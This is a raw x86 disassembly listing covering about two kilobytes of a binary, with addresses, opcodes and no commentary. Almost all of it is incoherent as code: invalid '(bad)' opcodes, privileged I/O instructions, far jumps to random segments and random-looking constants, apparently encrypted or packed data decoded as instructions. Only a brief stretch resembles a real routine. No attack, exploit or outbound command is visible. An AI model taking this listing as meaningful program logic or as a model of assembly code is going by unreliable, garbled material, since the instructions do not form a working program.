  41aad9:	inc    edx
  41aada:	pop    edi
  41aadb:	cmp    eax,0x7b69208b
  41aae0:	pushf  
  41aae1:	popa   
  41aae2:	or     al,0xb1
  41aae4:	psraw  mm3,QWORD PTR [eax-0x75]
  41aae8:	push   es
  41aae9:	pop    ebp
  41aaea:	mov    eax,ebx
  41aaec:	push   ebp
  41aaed:	jl     0x41ab21
  41aaef:	stc    
  41aaf0:	cmp    DWORD PTR [eax],ecx
  41aaf2:	out    dx,eax
  41aaf3:	out    dx,al
  41aaf4:	jae    0x41ab30
  41aaf6:	test   al,0xf0
  41aaf8:	inc    ecx
  41aaf9:	hlt    
  41aafa:	emms   
  41aafc:	mov    bl,BYTE PTR [ebx+0x57f625bf]
  41ab02:	(bad)  
  41ab03:	adc    al,0x6e
  41ab05:	fdivp  st(6),st
  41ab07:	jl     0x41aad0
  41ab09:	jo     0x41aaab
  41ab0b:	in     al,0x2e
  41ab0d:	loop   0x41ab54
  41ab0f:	sub    bl,al
  41ab11:	imul   ecx,DWORD PTR [edi+ecx*8],0x1a
  41ab15:	cmp    al,0xc1
  41ab17:	xchg   edx,eax
  41ab18:	and    edi,DWORD PTR [edi]
  41ab1a:	xor    BYTE PTR [eax-0x16051f2d],dh
  41ab20:	mov    ch,0xf9
  41ab22:	loopne 0x41ab28
  41ab24:	icebp  
  41ab25:	or     DWORD PTR [eax],0x2c
  41ab28:	inc    edi
  41ab29:	not    DWORD PTR [ecx+eiz*4]
  41ab2c:	jo     0x41aad0
  41ab2e:	add    al,BYTE PTR ss:[esi-0x40]
  41ab32:	std    
  41ab33:	cmp    eax,0xfc10ea2f
  41ab38:	dec    esp
  41ab39:	xor    ah,ch
  41ab3b:	out    dx,eax
  41ab3c:	jmp    0x41ab4b
  41ab3e:	js     0x41ab42
  41ab40:	xor    dh,BYTE PTR [eax+0x52]
  41ab43:	sahf   
  41ab44:	aam    0x48
  41ab46:	int    0x9
  41ab48:	inc    eax
  41ab49:	aaa    
  41ab4a:	xor    ebx,DWORD PTR [ebp+0x1709eb07]
  41ab50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab51:	popa   
  41ab52:	mov    ds:0xe3d80f1f,eax
  41ab57:	jae    0x41ab00
  41ab59:	sahf   
  41ab5a:	pop    ecx
  41ab5b:	ds push ebx
  41ab5d:	or     ecx,DWORD PTR [eax-0x8c68b06]
  41ab63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab64:	dec    edx
  41ab65:	loopne 0x41aaef
  41ab67:	scas   al,BYTE PTR es:[edi]
  41ab68:	mov    ecx,es
  41ab6a:	sbb    ah,ah
  41ab6c:	pcmpeqb mm4,QWORD PTR [edi+0x69]
  41ab70:	sub    al,0xc
  41ab72:	sub    al,BYTE PTR [ebx-0x3ce12fe0]
  41ab78:	call   0xefb86e97
  41ab7d:	pop    ecx
  41ab7e:	fsub   QWORD PTR [edx-0xf]
  41ab81:	mov    ebp,0xea9bac66
  41ab86:	cmp    al,0xc4
  41ab88:	xchg   ebp,eax
  41ab89:	aam    0xa1
  41ab8b:	or     DWORD PTR [edx-0x1e219d1e],ebx
  41ab91:	xor    ch,BYTE PTR [ebp-0x37]
  41ab94:	add    BYTE PTR [ebx-0xa9ac312],bl
  41ab9a:	aam    0xbc
  41ab9c:	fnstenv [ebx+esi*2]
  41ab9f:	push   0xffffffde
  41aba1:	sbb    ecx,DWORD PTR [edi]
  41aba3:	nop
  41aba4:	pop    es
  41aba5:	aas    
  41aba6:	out    dx,al
  41aba7:	inc    esi
  41aba8:	jns    0x41ab9c
  41abaa:	mov    ch,BYTE PTR [esi+0x38]
  41abad:	sbb    ah,dh
  41abaf:	inc    BYTE PTR [edi+ebp*1+0x1746cb60]
  41abb6:	mov    ebx,0xdf1c9f4c
  41abbb:	jmp    0xce1b:0x251df972
  41abc2:	cli    
  41abc3:	mov    ebp,0xb73cf995
  41abc8:	jns    0x41ac3d
  41abca:	sub    bh,BYTE PTR [esi-0x31]
  41abcd:	addr16 mov al,0xbf
  41abd0:	fdiv   st(5),st
  41abd2:	mov    ebp,0x376fa4a7
  41abd7:	or     al,0x5d
  41abd9:	xchg   BYTE PTR [edx+0x400733e],bl
  41abdf:	adc    eax,DWORD PTR [esi+0x66]
  41abe2:	xchg   edi,eax
  41abe3:	sub    DWORD PTR [ebp+ebp*4-0x5d],0xa8bce606
  41abeb:	mov    ebx,0xed0de72a
  41abf0:	sbb    DWORD PTR [ebp+0x34e6e690],esi
  41abf6:	xchg   ebp,eax
  41abf7:	mov    bl,0xeb
  41abf9:	push   ds
  41abfa:	fcomp  DWORD PTR [eax]
  41abfc:	or     BYTE PTR [esi],bl
  41abfe:	mov    ebx,0xfcc5e173
  41ac03:	adc    BYTE PTR [ecx+0x4ebb155e],bl
  41ac09:	xchg   BYTE PTR [edx+0x45],ah
  41ac0c:	pop    es
  41ac0d:	(bad)  
  41ac0e:	sub    al,0xc2
  41ac10:	cs pop es
  41ac12:	push   edi
  41ac13:	mov    ch,0x67
  41ac15:	push   ebp
  41ac16:	mov    ds:0x3d3b2a18,al
  41ac1b:	enter  0xc253,0x4
  41ac1f:	push   ds
  41ac20:	dec    eax
  41ac21:	xor    eax,0xedac9732
  41ac26:	and    DWORD PTR [eax],0x58
  41ac29:	ret    
  41ac2a:	jge    0x41abb6
  41ac2c:	sub    dh,BYTE PTR [ebp-0x45]
  41ac2f:	icebp  
  41ac30:	arpl   WORD PTR [ebp-0x19],bp
  41ac33:	test   BYTE PTR [ebx],ah
  41ac35:	cs jnp 0x41ac9c
  41ac38:	sbb    edi,DWORD PTR [eax-0x25a9065e]
  41ac3e:	pop    ebx
  41ac3f:	in     al,dx
  41ac40:	xchg   esp,eax
  41ac41:	lods   al,BYTE PTR ds:[esi]
  41ac42:	outs   dx,DWORD PTR ds:[esi]
  41ac43:	inc    ebp
  41ac44:	push   ebp
  41ac45:	icebp  
  41ac46:	jmp    0x41abcd
  41ac48:	cli    
  41ac49:	call   0x3eae:0x682a0fd6
  41ac50:	adc    eax,0x8bdda49b
  41ac55:	jge    0x41ac47
  41ac57:	mov    DWORD PTR ds:0x42a33d,0x59ed
  41ac61:	sub    edi,edx
  41ac63:	mov    edx,DWORD PTR [ebp-0x4]
  41ac66:	add    DWORD PTR ds:0x42a2fd,0x42a409
  41ac70:	xor    edx,eax
  41ac72:	and    DWORD PTR ds:0x42a3cd,0x42a3c9
  41ac7c:	add    edx,ecx
  41ac7e:	mov    DWORD PTR ds:0x42a335,0x1963
  41ac88:	jmp    0x41b19a
  41ac8d:	int    0xca
  41ac8f:	enter  0xdbc8,0xda
  41ac93:	int    0xc9
  41ac95:	(bad)  
  41ac97:	stos   BYTE PTR es:[edi],al
  41ac98:	nop
  41ac99:	test   BYTE PTR [edi],0x0
  41ac9c:	jl     0x41acf8
  41ac9e:	xchg   BYTE PTR [edi+0x78],bh
  41aca1:	jae    0x41ad1f
  41aca3:	js     0x41ad1d
  41aca5:	cmp    BYTE PTR [edx],dh
  41aca7:	jg     0x41acc8
  41aca9:	pop    ecx
  41acaa:	and    ch,cl
  41acac:	enter  0x7583,0x3e
  41acb0:	add    dh,BYTE PTR [esi+ecx*8]
  41acb3:	stc    
  41acb4:	xor    al,0x6d
  41acb6:	daa    
  41acb7:	jmp    0xce5b19e
  41acbc:	sub    esi,ecx
  41acbe:	cld    
  41acbf:	adc    DWORD PTR [edx+0x5d0df8ed],ebp
  41acc5:	(bad)  
  41acc6:	jg     0x41acc4
  41acc8:	pop    ecx
  41acc9:	xchg   edx,eax
  41acca:	sbb    cl,BYTE PTR [ecx]
  41accc:	pop    esp
  41accd:	data16 mov ch,dh
  41acd0:	rcr    bl,0xe6
  41acd3:	xchg   edi,eax
  41acd4:	enter  0x32ef,0xaf
  41acd8:	mov    ebp,0x135369af
  41acdd:	sbb    eax,0x13350d18
  41ace2:	int    0xf9
  41ace4:	jmp    0x47b8:0x41baa0f1
  41aceb:	xchg   esp,eax
  41acec:	retf   0xb592
  41acef:	mov    edx,0x8087c0a6
  41acf4:	pop    es
  41acf5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41acf6:	test   al,al
  41acf8:	aad    0x2c
  41acfa:	jne    0x41ad1e
  41acfc:	in     eax,0xc4
  41acfe:	inc    ebp
  41acff:	xchg   edx,eax
  41ad00:	in     al,0xa
  41ad02:	dec    eax
  41ad03:	cmp    edi,DWORD PTR [ebx]
  41ad05:	adc    eax,esi
  41ad07:	lea    eax,[esi-0x436ec291]
  41ad0d:	pop    eax
  41ad0e:	mov    ds:0xf6103e66,al
  41ad13:	ds icebp 
  41ad15:	jmp    0x41acdf
  41ad17:	aaa    
  41ad18:	cmp    al,0x99
  41ad1a:	push   ebx
  41ad1b:	xchg   esp,eax
  41ad1c:	mov    edx,0xd2e83dc7
  41ad21:	test   BYTE PTR [ebx-0x69f49bee],ch
  41ad27:	mov    al,ds:0x4fcdb313
  41ad2c:	mov    al,0x8c
  41ad2e:	aam    0x3a
  41ad30:	add    DWORD PTR [ecx],0x6b
  41ad33:	clc    
  41ad34:	add    bh,BYTE PTR [ebx-0x75]
  41ad37:	in     eax,dx
  41ad38:	push   0x22adc45c
  41ad3d:	dec    ebp
  41ad3e:	cmp    DWORD PTR [ebx],eax
  41ad40:	mov    ebx,0x3cb7d986
  41ad45:	bt     DWORD PTR [ecx-0x25],edx
  41ad49:	sbb    BYTE PTR [edi-0x5c7537df],dl
  41ad4f:	aaa    
  41ad50:	test   dl,ah
  41ad52:	in     eax,0x3f
  41ad54:	sub    eax,0x66fcdb61
  41ad59:	ins    BYTE PTR es:[edi],dx
  41ad5a:	iret   
  41ad5b:	pop    ds
  41ad5c:	into   
  41ad5d:	daa    
  41ad5e:	sub    BYTE PTR [ecx+eax*1],dl
  41ad61:	sub    ah,BYTE PTR [edx]
  41ad63:	in     al,dx
  41ad64:	sbb    DWORD PTR [ecx-0xc],eax
  41ad67:	jg     0x745706ab
  41ad6d:	sbb    ch,bh
  41ad6f:	fsub   DWORD PTR [edx]
  41ad71:	pusha  
  41ad72:	mov    esi,0x166c6b6
  41ad77:	push   0x3bf0aa6c
  41ad7c:	push   eax
  41ad7d:	shl    esi,cl
  41ad7f:	ss das 
  41ad81:	cmp    edi,DWORD PTR [ebp-0x69]
  41ad84:	xchg   BYTE PTR [eax+0x6e],bh
  41ad87:	add    al,0xc4
  41ad89:	mov    ch,0x84
  41ad8b:	dec    ebp
  41ad8c:	mov    eax,0xd0201a08
  41ad91:	mov    cl,0x58
  41ad93:	repz mov dl,0x14
  41ad96:	sub    eax,0x43f2fff
  41ad9b:	out    dx,al
  41ad9c:	inc    ecx
  41ad9d:	cli    
  41ad9e:	pop    esi
  41ad9f:	mov    al,0x3a
  41ada1:	cli    
  41ada2:	test   BYTE PTR [ecx+0x73],dl
  41ada5:	dec    DWORD PTR ds:[edx]
  41ada8:	adc    BYTE PTR [ebp+eax*4-0xaebdab1],ch
  41adaf:	out    dx,al
  41adb0:	gs jb  0x41ae20
  41adb3:	cld    
  41adb4:	sub    bl,BYTE PTR [ecx-0x7d]
  41adb7:	mov    dh,0xea
  41adb9:	ja     0x41adbd
  41adbb:	fwait
  41adbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41adbd:	int    0x28
  41adbf:	cmp    eax,0x5d57bcf7
  41adc4:	adc    al,0x9
  41adc6:	out    0xe5,eax
  41adc8:	pop    ebx
  41adc9:	pop    edi
  41adca:	jmp    0x8de33e0
  41adcf:	jge    0x41ae04
  41add1:	mov    al,ds:0xf9cf2e17
  41add6:	dec    ebx
  41add7:	inc    ebx
  41add8:	mov    ecx,esi
  41adda:	xor    eax,0x8b2194eb
  41addf:	js     0x41adba
  41ade1:	(bad)  
  41ade2:	sar    DWORD PTR fs:[ecx],cl
  41ade5:	adc    cl,ah
  41ade7:	bound  ecx,QWORD PTR [edi-0xf1992bf]
  41aded:	and    al,0x83
  41adef:	sub    eax,ecx
  41adf1:	ficom  DWORD PTR [esi+0x53]
  41adf4:	jbe    0x41adb0
  41adf6:	pop    esp
  41adf7:	pusha  
  41adf8:	jmp    0x41ae71
  41adfa:	sub    ebx,edx
  41adfc:	push   0xcad0aa63
  41ae01:	fwait
  41ae02:	cmp    BYTE PTR [edi-0x475dc073],dl
  41ae08:	ss inc ecx
  41ae0a:	xchg   DWORD PTR [esi-0x8],esp
  41ae0d:	mov    esp,0xd6811d3f
  41ae12:	gs (bad) 
  41ae15:	jb     0x41ae0b
  41ae17:	retf   
  41ae18:	ja     0x41ae47
  41ae1a:	fs iret 
  41ae1c:	xor    DWORD PTR [ecx+edi*8],edi
  41ae1f:	push   ds
  41ae20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae22:	hlt    
  41ae23:	pop    esi
  41ae24:	loop   0x41adf7
  41ae26:	pop    ecx
  41ae27:	imul   esi,edi,0x16
  41ae2a:	les    ebp,FWORD PTR [esi-0x2]
  41ae2d:	jne    0x41ae63
  41ae2f:	dec    ecx
  41ae30:	rol    DWORD PTR [edx-0x1a],cl
  41ae33:	pop    esi
  41ae34:	xor    edx,DWORD PTR [edi-0x1f]
  41ae37:	sti    
  41ae38:	adc    ch,BYTE PTR ds:0x5cd2f97e
  41ae3e:	arpl   WORD PTR [edi],di
  41ae40:	in     al,0xe9
  41ae42:	adc    DWORD PTR [ecx-0x7b0e9eaa],edi
  41ae48:	pop    esp
  41ae49:	jecxz  0x41ae59
  41ae4b:	aam    0x3e
  41ae4d:	inc    ebp
  41ae4e:	mov    ?,WORD PTR [ecx+edx*2+0x48]
  41ae52:	inc    ecx
  41ae53:	sbb    al,BYTE PTR [ebx-0x3044ae5c]
  41ae59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae5a:	mov    ah,0xc4
  41ae5c:	mov    DWORD PTR [ebp+0x6ba7691c],edi
  41ae62:	imul   ebp,DWORD PTR [esi-0x77fe6355],0xe53ad0c6
  41ae6c:	or     BYTE PTR [esi+eiz*1+0x37d36ee4],0x19
  41ae74:	call   0x877af41f
  41ae79:	dec    esi
  41ae7a:	enter  0x8b44,0xab
  41ae7e:	or     DWORD PTR [ecx+0x0],esp
  41ae81:	mov    ds:0x6bbbeea9,eax
  41ae86:	jl     0x41aeb2
  41ae88:	xchg   BYTE PTR [ebx],dh
  41ae8a:	mov    al,0x3d
  41ae8c:	jae    0x41aedd
  41ae8e:	xchg   DWORD PTR [edi],edx
  41ae90:	inc    eax
  41ae91:	cmp    eax,DWORD PTR [edx+0x73a1f13d]
  41ae97:	mov    al,ds:0xf85b439c
  41ae9c:	dec    ebp
  41ae9d:	and    DWORD PTR [ebx+0x768957e9],esp
  41aea3:	mov    edx,0x2b160244
  41aea8:	imul   ebp,DWORD PTR [ebx+0x10],0x91221400
  41aeaf:	mov    esp,0x56e5bf72
  41aeb4:	sahf   
  41aeb5:	mov    bl,BYTE PTR [esi+0x7dc3c0]
  41aebb:	inc    ebp
  41aebc:	push   edx
  41aebd:	repz fistp QWORD PTR [edx-0x1becd782]
  41aec4:	sbb    BYTE PTR [eax],ch
  41aec6:	cs or  al,0xd0
  41aec9:	dec    ebp
  41aeca:	mov    edi,0x9961ce18
  41aecf:	or     BYTE PTR [edx-0x6feb1cbc],bh
  41aed5:	dec    eax
  41aed6:	dec    ebx
  41aed7:	ins    BYTE PTR es:[edi],dx
  41aed8:	arpl   WORD PTR [ecx],di
  41aeda:	xor    dh,BYTE PTR [ecx+ecx*4-0x42978ab7]
  41aee1:	push   esi
  41aee2:	xlat   BYTE PTR ds:[ebx]
  41aee3:	sbb    edi,DWORD PTR [esi-0x12f9e125]
  41aee9:	out    dx,al
  41aeea:	bound  edx,QWORD PTR [ebx]
  41aeec:	xlat   BYTE PTR ds:[ebx]
  41aeed:	mov    ebx,DWORD PTR [ebx+0x36037802]
  41aef3:	fisttp WORD PTR [esi]
  41aef5:	xlat   BYTE PTR ds:[ebx]
  41aef6:	lds    edi,FWORD PTR [ecx]
  41aef8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aef9:	add    DWORD PTR [ebp+0x715f8b10],edi
  41aeff:	pop    edi
  41af00:	hlt    
  41af01:	adc    esi,edi
  41af03:	jmp    edx
  41af05:	arpl   WORD PTR [esi+0x67],di
  41af08:	imul   ecx,DWORD PTR [ebx],0xffffffe7
  41af0b:	cdq    
  41af0c:	xchg   esp,eax
  41af0d:	and    DWORD PTR [edx],edi
  41af0f:	jecxz  0x41af02
  41af11:	mov    bh,0x5d
  41af13:	pop    edi
  41af14:	xchg   esi,eax
  41af15:	xchg   esp,eax
  41af16:	xchg   edx,eax
  41af17:	inc    edi
  41af18:	and    ebx,DWORD PTR [ebp-0x5e]
  41af1b:	ds fsub st(5),st
  41af1e:	pop    ds
  41af1f:	sbb    dh,dl
  41af21:	add    ecx,esp
  41af23:	jnp    0x41af11
  41af25:	xor    DWORD PTR [ebp+0x67468cac],0x1a
  41af2c:	retf   0xd366
  41af2f:	jl     0x41af12
  41af31:	nop
  41af32:	das    
  41af33:	sub    dh,ch
  41af35:	icebp  
  41af36:	ins    DWORD PTR es:[edi],dx
  41af37:	dec    edi
  41af38:	and    al,0x9
  41af3a:	add    edx,DWORD PTR [ecx]
  41af3c:	repnz mov esp,0x624fc10f
  41af42:	dec    eax
  41af43:	adc    BYTE PTR [edx-0x5fe68749],ah
  41af49:	arpl   WORD PTR [ebp+0x71],di
  41af4c:	inc    ebp
  41af4d:	and    eax,0xa6068134
  41af52:	pop    ebx
  41af53:	and    al,0xc4
  41af55:	les    ecx,FWORD PTR [ebp+0x49]
  41af58:	add    al,0xf
  41af5a:	outs   dx,DWORD PTR ds:[esi]
  41af5b:	out    dx,al
  41af5c:	dec    ebp
  41af5d:	rol    BYTE PTR [eax],cl
  41af5f:	lea    esi,[edx+0xb46b1b4]
  41af65:	jp     0x41afb0
  41af67:	fsubr  st,st(3)
  41af69:	repnz mov edi,0x20fd206e
  41af6f:	adc    edx,DWORD PTR [eax+ebp*2]
  41af72:	inc    ebp
  41af73:	jmp    0x41af64
  41af75:	popa   
  41af76:	std    
  41af77:	xor    al,0xc1
  41af79:	and    DWORD PTR [eax],0x4
  41af7c:	jb     0x41afeb
  41af7e:	jecxz  0x41affd
  41af80:	pop    esp
  41af81:	cmp    eax,0xfe978873
  41af86:	sahf   
  41af87:	xor    eax,0x74183002
  41af8c:	xchg   ecx,eax
  41af8d:	data16 jb 0x41afc8
  41af90:	fistp  WORD PTR [ebx+0x11]
  41af93:	not    BYTE PTR [edi]
  41af95:	xchg   ecx,eax
  41af96:	adc    BYTE PTR [ecx+eiz*2-0x48],al
  41af9a:	sub    bl,BYTE PTR [edi+0x23]
  41af9d:	xor    eax,0xddaf3e54
  41afa2:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41afa4:	mov    ?,WORD PTR [ecx-0x1535f573]
  41afaa:	call   0x3119:0x9f4f6940
  41afb1:	cdq    
  41afb2:	inc    BYTE PTR [edi+0x35b19458]
  41afb8:	jae    0x41afd6
  41afba:	push   esp
  41afbb:	push   0x1a8d30af
  41afc0:	pushf  
  41afc1:	xor    cl,BYTE PTR [ecx+ebp*2+0x2e7d6685]
  41afc8:	test   DWORD PTR [esi],edi
  41afca:	imul   eax,DWORD PTR [ecx+esi*1-0x14a93e4e],0x597ff458
  41afd5:	test   al,0xb8
  41afd7:	cli    
  41afd8:	lds    ebx,FWORD PTR [ecx-0x1d]
  41afdb:	xchg   ecx,eax
  41afdc:	xchg   ebx,eax
  41afdd:	clc    
  41afde:	loop   0x41afdf
  41afe0:	in     al,0xdf
  41afe2:	rcr    BYTE PTR [eax+0x70],1
  41afe5:	ret    
  41afe6:	retf   0xc37f
  41afe9:	mov    bx,0x504b
  41afed:	sub    DWORD PTR [eax],0x56
  41aff0:	pop    esp
  41aff1:	and    dh,BYTE PTR [edx+ebx*1-0x5b]
  41aff5:	mov    ebx,0x4078a688
  41affa:	fmul   DWORD PTR [esi+0x58]
  41affd:	or     eax,0x55c91495
  41b002:	sbb    eax,ebp
  41b004:	mov    ecx,DWORD PTR [edx+0x89c8854]
  41b00a:	lods   eax,DWORD PTR ds:[esi]
  41b00b:	push   ebx
  41b00c:	jnp    0x41afa5
  41b00e:	jbe    0x41afdb
  41b010:	inc    edi
  41b011:	arpl   ax,sp
  41b013:	cdq    
  41b014:	xor    al,0xf0
  41b016:	push   ecx
  41b017:	jne    0x41b098
  41b019:	mov    al,0x3b
  41b01b:	sub    eax,0x19945460
  41b020:	ja     0x41b002
  41b022:	addr16 jl 0x41afcf
  41b025:	aam    0x5d
  41b027:	outs   dx,BYTE PTR ds:[esi]
  41b028:	cli    
  41b029:	cli    
  41b02a:	push   ds
  41b02b:	cmp    ebp,ebx
  41b02d:	scas   eax,DWORD PTR es:[edi]
  41b02e:	mov    ebx,0x3768a783
  41b033:	push   ebx
  41b034:	js     0x41b070
  41b036:	jnp    0x41afbf
  41b038:	mov    esi,0x2b066b99
  41b03d:	daa    
  41b03e:	in     eax,dx
  41b03f:	(bad)
  41b042:	or     ebp,DWORD PTR [ebx-0x6a]
  41b045:	mov    bh,BYTE PTR [ecx-0x54a9fe6e]
  41b04b:	imul   esp,DWORD PTR [ebp-0x4d],0x7eae703c
  41b052:	cmp    ch,BYTE PTR ds:0xbc04f75f
  41b058:	and    DWORD PTR [eax+0x4fe96ece],ebx
  41b05e:	(bad)  
  41b05f:	sub    eax,DWORD PTR [eax+eax*8-0xe479a20]
  41b066:	push   eax
  41b067:	mov    esi,esp
  41b069:	and    edi,eax
  41b06b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b06c:	jecxz  0x41b02b
  41b06e:	sbb    DWORD PTR [ebp+0x5b],eax
  41b071:	not    bh
  41b073:	lods   al,BYTE PTR ds:[esi]
  41b074:	sbb    dl,BYTE PTR [ecx+esi*1+0x32a879aa]
  41b07b:	addr16 enterw 0xf762,0x94
  41b081:	mov    ebp,0x2510bfaa
  41b086:	retf   
  41b087:	(bad)  
  41b089:	dec    esp
  41b08a:	inc    ebx
  41b08b:	pop    ds
  41b08c:	pop    edi
  41b08d:	push   eax
  41b08e:	mov    al,ds:0xae2b4ffd
  41b093:	or     eax,0xbc1df3d4
  41b098:	or     ah,BYTE PTR [ebx+ebp*1+0x5e]
  41b09c:	push   ss
  41b09d:	inc    esp
  41b09e:	cmp    DWORD PTR [esi+0x3d],edx
  41b0a1:	sar    DWORD PTR [ecx],1
  41b0a3:	pop    ebp
  41b0a4:	jmp    0x41b0c1
  41b0a6:	xchg   edi,eax
  41b0a7:	std    
  41b0a8:	push   ds
  41b0a9:	and    eax,0x13564b64
  41b0ae:	into   
  41b0af:	test   DWORD PTR [edx],ebx
  41b0b1:	jb     0x41b08a
  41b0b3:	cmp    ah,ch
  41b0b5:	mov    dl,0x94
  41b0b7:	jmp    0x41b093
  41b0b9:	inc    edi
  41b0ba:	out    0xd9,eax
  41b0bc:	add    edx,DWORD PTR [esp+ecx*8]
  41b0bf:	and    dh,BYTE PTR [esi-0x479e8bb0]
  41b0c5:	push   ecx
  41b0c6:	cmp    DWORD PTR [si+0x11],esi
  41b0ca:	xchg   edi,eax
  41b0cb:	imul   ecx,esp,0xe
  41b0ce:	xor    eax,0x3cf624df
  41b0d3:	jg     0x41b0ba
  41b0d5:	jnp    0x41b06f
  41b0d7:	into   
  41b0d8:	and    ch,BYTE PTR ds:0x9efe823d
  41b0de:	int    0x2e
  41b0e0:	sub    esi,esp
  41b0e2:	bound  esp,QWORD PTR [esi-0x29]
  41b0e5:	xchg   ecx,eax
  41b0e6:	call   0xc06c:0x76f63c6e
  41b0ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b0ee:	cmc    
  41b0ef:	mov    ch,0xa9
  41b0f1:	daa    
  41b0f2:	arpl   sp,cx
  41b0f4:	ret    
  41b0f5:	das    
  41b0f6:	sbb    ebp,DWORD PTR [edi]
  41b0f8:	imul   DWORD PTR [eax+0x73]
  41b0fb:	adc    DWORD PTR [ebx+0x24],esi
  41b0fe:	sbb    ebp,ebp
  41b100:	add    ecx,DWORD PTR [ebx-0x3]
  41b103:	adc    edx,DWORD PTR [esi-0x6f2b676e]
  41b109:	pop    ebx
  41b10a:	mov    al,0xef
  41b10c:	lea    edi,[ecx-0x4644e387]
  41b112:	sub    eax,0xbc5be396
  41b117:	mov    al,0xe
  41b119:	push   ds
  41b11a:	jo     0x41b0a1
  41b11c:	ror    edx,cl
  41b11e:	inc    ebp
  41b11f:	xchg   ebx,eax
  41b120:	mov    cs,WORD PTR ds:0xc1a76af0
  41b126:	shl    DWORD PTR [ecx-0x5d25d450],0xe5
  41b12d:	pop    ebx
  41b12e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b12f:	frstor [ebx]
  41b131:	icebp  
  41b132:	dec    ebx
  41b133:	(bad)  
  41b134:	int    0x75
  41b136:	adc    bh,BYTE PTR [ebx]
  41b138:	aad    0xb3
  41b13a:	inc    eax
  41b13b:	jmp    0xfd57bfec
  41b140:	ins    DWORD PTR es:[edi],dx
  41b141:	pop    ecx
  41b142:	push   0x9c396259
  41b147:	add    al,ah
  41b149:	or     DWORD PTR [ebp-0x2cca7d97],esi
  41b14f:	scas   al,BYTE PTR es:[edi]
  41b150:	xchg   BYTE PTR [eax],cl
  41b152:	or     al,0xba
  41b154:	cmp    BYTE PTR [esp+esi*4],ah
  41b157:	adc    al,BYTE PTR [ebx-0x19]
  41b15a:	xabort 0x11
  41b15d:	test   edi,edi
  41b15f:	add    DWORD PTR [ebx],ebx
  41b161:	test   al,0xb3
  41b163:	neg    DWORD PTR [ebx-0x7bc72a2a]
  41b169:	aam    0xe5
  41b16b:	mov    edx,0x2b24d96a
  41b170:	cmp    edi,DWORD PTR [eax-0x4b]
  41b173:	mov    al,0xbc
  41b175:	mov    ds:0xfbbc6d63,eax
  41b17a:	mov    ds,edx
  41b17c:	popfw  
  41b17e:	pop    ebp
  41b17f:	adc    sp,0xffac
  41b183:	loope  0x41b1ac
  41b185:	push   ebx
  41b186:	bound  ecx,QWORD PTR [ebx-0x3f]
  41b189:	scas   al,BYTE PTR es:[edi]
  41b18a:	retf   
  41b18b:	add    BYTE PTR [ebx+ebp*8],dl
  41b18e:	das    
  41b18f:	jbe    0x41b116
  41b191:	sbb    eax,0xcd8a0e0
  41b197:	out    dx,al
  41b198:	add    edi,edi
  41b19a:	cmp    edi,edx
  41b19c:	jmp    0x41b6ae
  41b1a1:	(bad)
  41b1a4:	retf   0xdad9
  41b1a7:	leave  
  41b1a8:	shr    DWORD PTR [eax+0x64b5793a],cl
  41b1ae:	add    DWORD PTR [ebx],edx
  41b1b0:	call   0x7c73:0x787f894d
  41b1b7:	js     0x41b231
  41b1b9:	jae    0x41b21d
  41b1bb:	stos   BYTE PTR es:[edi],al
  41b1bc:	loopne 0x41b162
  41b1be:	and    eax,DWORD PTR [edi]
  41b1c0:	fcomp  st(2)
  41b1c2:	out    dx,eax
  41b1c3:	je     0x41b241
  41b1c5:	push   ebx
  41b1c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1c7:	or     BYTE PTR [esi-0x32],cl
  41b1ca:	xchg   esp,eax
  41b1cb:	nop
  41b1cc:	sub    al,0x14
  41b1ce:	sahf   
  41b1cf:	loopne 0x41b1fb
  41b1d1:	inc    edx
  41b1d2:	mov    esp,0x7c8abe60
  41b1d7:	out    0xb6,al
  41b1d9:	add    al,BYTE PTR ds:0x6e494cfe
  41b1df:	xor    eax,0xca9144eb
  41b1e4:	test   ch,0x37
  41b1e7:	popa   
  41b1e8:	in     al,dx
  41b1e9:	mov    ebp,0xf6efaf45
  41b1ee:	inc    ecx
  41b1ef:	mov    ah,0x2d
  41b1f1:	mov    esi,DWORD PTR [ebp-0x62]
  41b1f4:	or     al,0x19
  41b1f6:	cs inc ebp
  41b1f8:	repz mov ebx,0x75c41f8f
  41b1fe:	xor    esp,DWORD PTR [edx]
  41b200:	call   0xd41d20d3
  41b205:	ret    
  41b206:	or     dl,BYTE PTR [ecx]
  41b208:	mov    dl,ah
  41b20a:	sbb    esi,DWORD PTR [eax+edx*8]
  41b20d:	mov    WORD PTR [edx-0x1a],cs
  41b210:	mov    DWORD PTR [edi],esi
  41b212:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b213:	pop    es
  41b214:	shl    BYTE PTR cs:[esi-0x2107abcc],cl
  41b21b:	pop    eax
  41b21c:	jecxz  0x41b25a
  41b21e:	pand   mm2,QWORD PTR [eax+ebx*8+0x73]
  41b223:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b224:	fcmovnbe st,st(1)
  41b226:	sub    al,0x9f
  41b228:	add    DWORD PTR [edi+esi*2],0x7
  41b22c:	ins    BYTE PTR es:[edi],dx
  41b22d:	pop    edi
  41b22e:	outs   dx,BYTE PTR ds:[esi]
  41b22f:	mov    dl,cl
  41b231:	push   es
  41b232:	xchg   edi,eax
  41b233:	(bad)  
  41b234:	push   ds
  41b235:	imul   eax,DWORD PTR [ebx],0xefc46360
  41b23b:	sbb    bl,BYTE PTR cs:[ebx]
  41b23e:	inc    ecx
  41b23f:	jecxz  0x41b1d8
  41b241:	push   edi
  41b242:	cs adc ebx,0xffffffe0
  41b246:	or     ebx,DWORD PTR [edi-0x6a]
  41b249:	and    esp,edx
  41b24b:	syscall 
  41b24d:	adc    bl,BYTE PTR [esp+0x38923e0a]
  41b254:	imul   edi,DWORD PTR [ecx-0x76ad8e25],0xffffffc4
  41b25b:	inc    esi
  41b25c:	repz int3 
